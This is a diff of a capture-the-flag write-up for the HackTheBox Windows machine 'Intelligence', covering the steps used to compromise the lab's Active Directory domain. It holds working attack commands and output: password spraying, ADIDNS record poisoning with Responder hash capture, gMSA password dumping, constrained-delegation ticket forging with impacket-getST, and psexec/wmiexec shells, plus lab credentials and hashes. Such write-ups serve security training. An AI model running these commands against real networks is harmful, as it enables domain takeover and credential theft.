@@ -11,19 +11,32 @@
 
 > Intelligence is a medium difficulty Windows machine that showcases a number of common attacks in an Active Directory environment. After retrieving internal PDF documents stored on the web server (by brute-forcing a common naming scheme) and inspecting their contents and metadata, which reveal a default password and a list of potential AD users, password spraying leads to the discovery of a valid user account, granting initial foothold on the system. A scheduled PowerShell script that sends authenticated requests to web servers based on their hostname is discovered; by adding a custom DNS record, it is possible to force a request that can be intercepted to capture the hash of a second user, which is easily crackable. This user is allowed to read the password of a group managed service account, which in turn has constrained delegation access to the domain controller, resulting in a shell with administrative privileges.
 
+#### Skills Required
+
+- Password spraying
+- Password cracking
+- Basic Active Directory knowledge
+
+#### Skills Learned
+
+- [ADIDNS abuse](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing)
+- [ReadGMSAPassword abuse](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)
+- [Constrained delegation abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained)
+
 #### Tools Used
 
 - bloodhound
 - bloodhound-python
 - crackmapexec
-- dnstool (krbrelayx)
+- dnstool.py (krbrelayx)
 - exiftool
 - gMSADumper
 - gobuster
 - impacket-getST
 - impacket-psexec
-- kerbrute
+- impacket-wmiexec
 - john
+- kerbrute
 - ldapsearch
 - nmap
 - nslookup
@@ -54,7 +67,7 @@ tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
 10.10.10.248 is alive ←
 ```
 
-`nmap -Pn -sSV -p- -T5 10.10.10.248`:
+`sudo nmap -Pn -sSV -p- -T5 10.10.10.248`:
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 16:46 CEST
 Nmap scan report for 10.10.10.248
@@ -97,18 +110,15 @@ SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\: ←
 ```
 
-<❌ Failed Step>
-
 `crackmapexec smb 10.10.10.248 -u '' -p '' --shares`:
 ```
 SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\:
 SMB         10.10.10.248    445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED ←
 ```
+❌
 
-</❌ Failed Step>
-
-`nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.248`:
+`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.10.248`:
 ```
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 16:51 CEST
 Nmap scan report for 10.10.10.248
@@ -248,8 +258,6 @@ result: 0 Success
 # numEntries: 1
 ```
 
-<❌ Failed Step>
-
 `ldapsearch -x -H ldap://10.10.10.248/ -b "DC=intelligence,DC=htb" '(objectClass=*)'`:
 ```
 # extended LDIF
@@ -268,10 +276,7 @@ text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 
 # numResponses: 1
 ```
-
-</❌ Failed Step>
-
-<❌ Failed Step>
+❌
 
 `crackmapexec smb 10.10.10.248 -d 'intelligence.htb' -u '' -p '' --users`:
 ```
@@ -279,8 +284,7 @@ SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763
 SMB         10.10.10.248    445    DC               [+] intelligence.htb\: 
 SMB         10.10.10.248    445    DC               [*] Trying to dump local users with SAMRPC protocol
 ```
-
-</❌ Failed Step>
+❌
 
 `gobuster dir -u http://10.10.10.248 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
 ```
@@ -341,7 +345,7 @@ false,GET,https://fontawesome.com/,Out of Scope
 false,GET,https://fontawesome.com/license/free,Out of Scope
 ```
 
-`cat ./spider.csv | grep "true" | awk -F ',' '{ print $3 }' | sort -u | tee ./spider_urls.list`:
+`cat ./spider.csv | grep "true" | awk -F ',' '{ print $3 }' | sort -u`:
 ```
 http://intelligence.htb
 http://intelligence.htb/
@@ -366,7 +370,7 @@ http://intelligence.htb/sitemap.xml
 
 `Sites: http://10.10.10.248` > `<right-click>` > `Attack` > `Active Scan...` > `Starting Point: http://10.10.10.248`, `Recurse: enabled` > `Start Scan` > `Export` > `./activescan.csv`
 
-`cat ./activescan.csv | grep 200 | awk -F',' '{ print $5 }' | sort -u`:
+`cat ./activescan.csv | grep -v -E '400|401|404|500' | awk -F ',' '{ print $5 }' | sort -u`:
 ```
 http://intelligence.htb/
 http://intelligence.htb/documents/all.js
@@ -377,9 +381,8 @@ http://intelligence.htb/documents/demo-image-01.jpg
 http://intelligence.htb/documents/demo-image-02.jpg
 http://intelligence.htb/documents/favicon.ico
 http://intelligence.htb/documents/jquery.easing.min.js
-http://intelligence.htb/documents/jquery.min.js
-http://intelligence.htb/documents/scripts.js
-http://intelligence.htb/documents/styles.css
+
+[...]
 ```
 
 `wget http://intelligence.htb/documents/2020-01-01-upload.pdf http://intelligence.htb/documents/2020-12-15-upload.pdf`:
@@ -763,34 +766,6 @@ SPIDER_P... 10.10.10.248    445    DC               [*] File size max:        4.
 }
 ```
 
-`smbclient -U 'Tiffany.Molina' --password='NewIntelligenceCorpUser9876' //10.10.10.248/IT`:
-```
-Try "help" to get a list of possible commands.
-smb: \> dir
-  .                                   D        0  Mon Apr 19 02:50:55 2021
-  ..                                  D        0  Mon Apr 19 02:50:55 2021
-  downdetector.ps1                    A     1046  Mon Apr 19 02:50:55 2021 ←
-
-                3770367 blocks of size 4096. 1448611 blocks available
-smb: \> get downdetector.ps1 ←
-getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
-smb: \> exit
-```
-
-`cat ./downdetector.ps1`:
-```powershell
-# Check web server status. Scheduled to run every 5min
-Import-Module ActiveDirectory 
-foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
-try {
-$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials ←
-if(.StatusCode -ne 200) {
-Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down" ←
-}
-} catch {}
-}
-```
-
 `smbclient -U 'Tiffany.Molina' --password='NewIntelligenceCorpUser9876' //10.10.10.248/Users`:
 ```
 Try "help" to get a list of possible commands.
@@ -818,8 +793,6 @@ smb: \> exit
 ```
 b276c*************************** ←
 ```
-
-<❌ Failed Step>
 
 `bloodhound-python -d 'intelligence.htb' -dc 'intelligence.htb' -ns 10.10.10.248 -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -c All`:
 ```
@@ -889,9 +862,35 @@ INFO: Done in 00M 12S
 
 `Analysis` > `Shortest Paths` > `Shortest Paths to High Value Targets` > `Select a Domain: INTELLIGENCE.HTB`
 
-</❌ Failed Step>
+`smbclient -U 'Tiffany.Molina' --password='NewIntelligenceCorpUser9876' //10.10.10.248/IT`:
+```
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon Apr 19 02:50:55 2021
+  ..                                  D        0  Mon Apr 19 02:50:55 2021
+  downdetector.ps1                    A     1046  Mon Apr 19 02:50:55 2021 ←
 
-`cd /opt`
+                3770367 blocks of size 4096. 1448611 blocks available
+smb: \> get downdetector.ps1 ←
+getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
+smb: \> exit
+```
+
+`cat ./downdetector.ps1`:
+```powershell
+# Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
+try {
+$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials ←
+if(.StatusCode -ne 200) {
+Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down" ←
+}
+} catch {}
+}
+```
+
+The script loops through DNS records and sends an authenticated request to any host having a name starting with `web` in order to check its status. We can leverage the permission (granted by default to authenticated users) to create arbitrary DNS records on the Active Directory Integrated DNS (ADIDNS) zone to add a new record that points to our own IP address. This can be accomplished using the `dnstool.py` script from `krbrelayx`.
 
 `git clone https://github.com/dirkjanm/krbrelayx.git`:
 ```
@@ -954,7 +953,7 @@ Host: web-h4x0r ←
 Connection: Keep-Alive
 ```
 
-`responder -I tun0`:
+`sudo responder -I tun0`:
 ```
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
@@ -1080,13 +1079,15 @@ SVC_INT$ ---(AllowedToDelegate)--- DC.INTELLIGENE.HTB ←
 
 `ReadGMSAPassword`:
 ```
+Info:
+
 SVC_INT$@INTELLIGENCE.HTB is a Group Managed Service Account. The group ITSUPPORT@INTELLIGENCE.HTB can retrieve the password for the GMSA SVC_INT$@INTELLIGENCE.HTB.
 
 Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is mananaged by and automatically changed by Domain Controllers on a set interval (check the MSDS-ManagedPasswordInterval attribute).
 
 The intended use of a GMSA is to allow certain computer accounts to retrieve the password for the GMSA, then run local services as the GMSA. An attacker with control of an authorized principal may abuse that privilege to impersonate the GMSA.
-
-===
+```
+```
 Linux Abuse:
 
 There are several ways to abuse the ability to read the GMSA password. The most straight forward abuse is possible when the GMSA is currently logged on to a computer, which is the intended behavior for a GMSA. If the GMSA is logged on to the computer account which is granted the ability to retrieve the GMSA's password, simply steal the token from the process running as the GMSA, or inject into that process.
@@ -1094,7 +1095,6 @@ There are several ways to abuse the ability to read the GMSA password. The most 
 If the GMSA is not logged onto the computer, you may create a scheduled task or service set to run as the GMSA. The computer account will start the sheduled task or service as the GMSA, and then you may abuse the GMSA logon in the same fashion you would a standard user running processes on the machine (see the "HasSession" help modal for more details).
 
 Finally, it is possible to remotely retrieve the password for the GMSA and convert that password to its equivalent NT hash.[gMSADumper.py](https://github.com/micahvandeusen/gMSADumper) can be used for that purpose.
-
 ~~~
 gMSADumper.py -u 'user' -p 'password' -d 'domain.local'
 ~~~
@@ -1120,23 +1120,24 @@ At this point you are ready to use the NT hash the same way you would with a reg
 
 `AllowedToDelegate`:
 ```
+Info:
+
 The user SVC_INT$@INTELLIGENCE.HTB has the constrained delegation privilege to the computer DC.INTELLIGENCE.HTB.
 
 The constrained delegation primitive allows a principal to authenticate as any user to specific services (found in the msds-AllowedToDelegateTo LDAP property in the source node tab) on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host. One caveat- impersonated users can not be in the "Protected Users" security group or otherwise have delegation privileges revoked.
 
 An issue exists in the constrained delegation where the service name (sname) of the resulting ticket is not a part of the protected ticket information, meaning that an attacker can modify the target service name to any service of their choice. For example, if msds-AllowedToDelegateTo is "HTTP/host.domain.com", tickets can be modified for LDAP/HOST/etc. service names, resulting in complete server compromise, regardless of the specific service listed.
-
-===
+```
+```
 Linux Abuse:
 
 In the following example, *victim* is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, *victim* has the "HTTP/PRIMARY.testlab.local" service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the *victim* user and executes the S4U2self/S4U2proxy process to impersonate the "admin" user to the "HTTP/PRIMARY.testlab.local" SPN. The alternative sname "cifs" is substituted in to the final service ticket. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the "admin" user.
-
 ~~~
 getST.py -spn 'HTTP/PRIMARY.testlab.local' -impersonate 'admin' -altservice 'cifs' -hashes :2b576acbe6bcfda7294d6bd18041b8fe 'domain/victim'
 ~~~
 ```
 
-`cd /opt`
+We can see that our user is a member of the `ITSUPPORT` group, which has `ReadGMSAPassword` rights on `SVC_INT` which in turn has `AllowedToDelegate` rights to the Domain Controller. We can use the `gMSADumper` tool to get the service account password hash.
 
 `git clone https://github.com/micahvandeusen/gMSADumper.git`
 
@@ -1152,7 +1153,7 @@ total 52
 -rw-r--r-- 1 root root    73 Oct 26 11:05 requirements.txt
 ```
 
-`python3 ./gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'`:
+`python3 ./gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb' -l 10.10.10.248`:
 ```
 Users or groups who can read password for svc_int$:
  > DC$
@@ -1284,9 +1285,9 @@ msds-generationid:             15885a6e1e9014de...
 msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb 
 ```
 
-<❌ Failed Step>
+We can now abuse constrained delegation to request a TGT for the `Administrator` user (if the clock skew is too high, we can use a tool like `ntpdate` to adjust our time).
 
-`impacket-getST 'intelligence.htb/svc_int$' -hashes ':1d7a055a77db01cde7db3f4d006081fb' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs'`:
+`impacket-getST 'intelligence.htb/svc_int' -hashes ':1d7a055a77db01cde7db3f4d006081fb' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator'`:
 ```
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -1294,29 +1295,27 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] Getting TGT for user
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great) ←
 ```
+❌
 
-</❌ Failed Step>
-
-`ntpdate 10.10.10.248`:
+`sudo ntpdate 10.10.10.248`:
 ```
 2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
 CLOCK: time stepped by 25197.836583 ←
 ```
 
-`impacket-getST 'intelligence.htb/svc_int$' -hashes ':1d7a055a77db01cde7db3f4d006081fb' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' -altservice 'cifs'`:
+`impacket-getST 'intelligence.htb/svc_int$' -hashes ':1d7a055a77db01cde7db3f4d006081fb' -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator'`:
 ```
-Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
 [*] Impersonating Administrator
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
-[*] Changing service from WWW/dc.intelligence.htb@INTELLIGENCE.HTB to cifs/dc.intelligence.htb@INTELLIGENCE.HTB
-[*] Saving ticket in Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache ←
+[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache ←
 ```
 
-`mv ./Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache ./Administrator.ccache`
+`mv ./Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache ./Administrator.ccache`
 
 `KRB5CCNAME=./Administrator.ccache klist`:
 ```
@@ -1324,11 +1323,29 @@ Ticket cache: FILE:./Administrator.ccache
 Default principal: Administrator@intelligence.htb
 
 Valid starting       Expires              Service principal
-11/01/2024 01:53:45  11/01/2024 11:53:45  cifs/dc.intelligence.htb@INTELLIGENCE.HTB ←
-        renew until 11/02/2024 01:53:44
+11/07/2024 01:30:14  11/07/2024 11:30:14  WWW/dc.intelligence.htb@INTELLIGENCE.HTB ←
+        renew until 11/08/2024 01:30:14
 ```
 
-<❌ Failed Step>
+We can now use the acquired ticket to get a shell as `Administrator` via `psexec` or `wmiexec`.
+
+`KRB5CCNAME=./Administrator.ccache crackmapexec smb 10.10.10.248 -u 'Administrator' -k --use-kcache`:
+```
+SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
+SMB         10.10.10.248    445    DC               [-] intelligence.htb\Administrator from ccache STATUS_MORE_PROCESSING_REQUIRED ←
+```
+❌
+
+`sudo ntpdate 10.10.10.248`:
+```
+2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
+CLOCK: time stepped by 25197.836583 ←
+```
+
+`KRB5CCNAME=./Administrator.ccache crackmapexec smb 10.10.10.248 -u 'Administrator' -k --use-kcache`:
+```
+```
+❌
 
 `KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@10.10.10.248' -k -no-pass`:
 ```
@@ -1336,24 +1353,77 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
 [-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid) ←
 ```
-
-</❌ Failed Step>
+❌
 
 `KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
 ```
-Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Requesting shares on 10.10.10.248.....
+[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete. ←
+```
+❌
+
+`sudo ntpdate 10.10.10.248`:
+```
+2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
+CLOCK: time stepped by 25197.836583 ←
+```
+
+`KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
+```
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.intelligence.htb.....
 [*] Found writable share ADMIN$ ←
-[*] Uploading file LXSnIyFj.exe
-[*] Opening SVCManager on 10.10.10.248.....
-[*] Creating service WAxK on 10.10.10.248.....
-[*] Starting service WAxK.....
+[*] Uploading file NDyBcJXk.exe
+[*] Opening SVCManager on dc.intelligence.htb.....
+[*] Creating service ApfT on dc.intelligence.htb.....
+[*] Starting service ApfT.....
+[-] Something wen't wrong connecting the pipes(<class '__main__.RemoteStdInPipe'>), try again ←
 [!] Press help for extra shell commands
-Microsoft Windows [Version 10.0.14393]
-(c) 2016 Microsoft Corporation. All rights reserved.
+```
+❌
 
-C:\Windows\system32>
+`KRB5CCNAME=./Administrator.ccache crackmapexec wmi 10.10.10.248 -u 'Administrator' -k --use-kcache`:
+```
+RPC         10.10.10.248    135    DC               [*] Windows NT 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
+RPC         10.10.10.248    135    DC               [-] intelligence.htb\Administrator from ccache KRB_AP_ERR_SKEW ←
+```
+❌
+
+`sudo ntpdate 10.10.10.248`:
+```
+2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
+CLOCK: time stepped by 25197.836583 ←
+```
+
+`KRB5CCNAME=./Administrator.ccache crackmapexec wmi 10.10.10.248 -u 'Administrator' -k --use-kcache`:
+```
+```
+❌
+
+`KRB5CCNAME=./Administrator.ccache impacket-wmiexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
+```
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
+```
+❌
+
+`sudo ntpdate 10.10.10.248`:
+```
+2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
+CLOCK: time stepped by 25197.836583 ←
+```
+
+`KRB5CCNAME=./Administrator.ccache impacket-wmiexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
+```
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute ←
+[!] Press help for extra shell commands
+C:\>
 ```
 
 ![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)
@@ -1368,20 +1438,20 @@ nt authority\system ←
 `dir`:
 ```
  Volume in drive C has no label.
- Volume Serial Number is 61F2-A88F
+ Volume Serial Number is E3EF-EBBD
 
  Directory of C:\Users\Administrator\Desktop
 
-09/23/2019  02:15 PM    <DIR>          .
-09/23/2019  02:15 PM    <DIR>          ..
-10/23/2024  05:34 AM                34 root.txt ←
+04/18/2021  04:51 PM    <DIR>          .
+04/18/2021  04:51 PM    <DIR>          ..
+11/05/2024  01:28 AM                34 root.txt ←
                1 File(s)             34 bytes
-               2 Dir(s)  10,276,347,904 bytes free
+               2 Dir(s)   5,874,884,608 bytes free
 ```
 
 `type root.txt`:
 ```
-44de8*************************** ←
+c396d*************************** ←
 ```
 
 <img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>
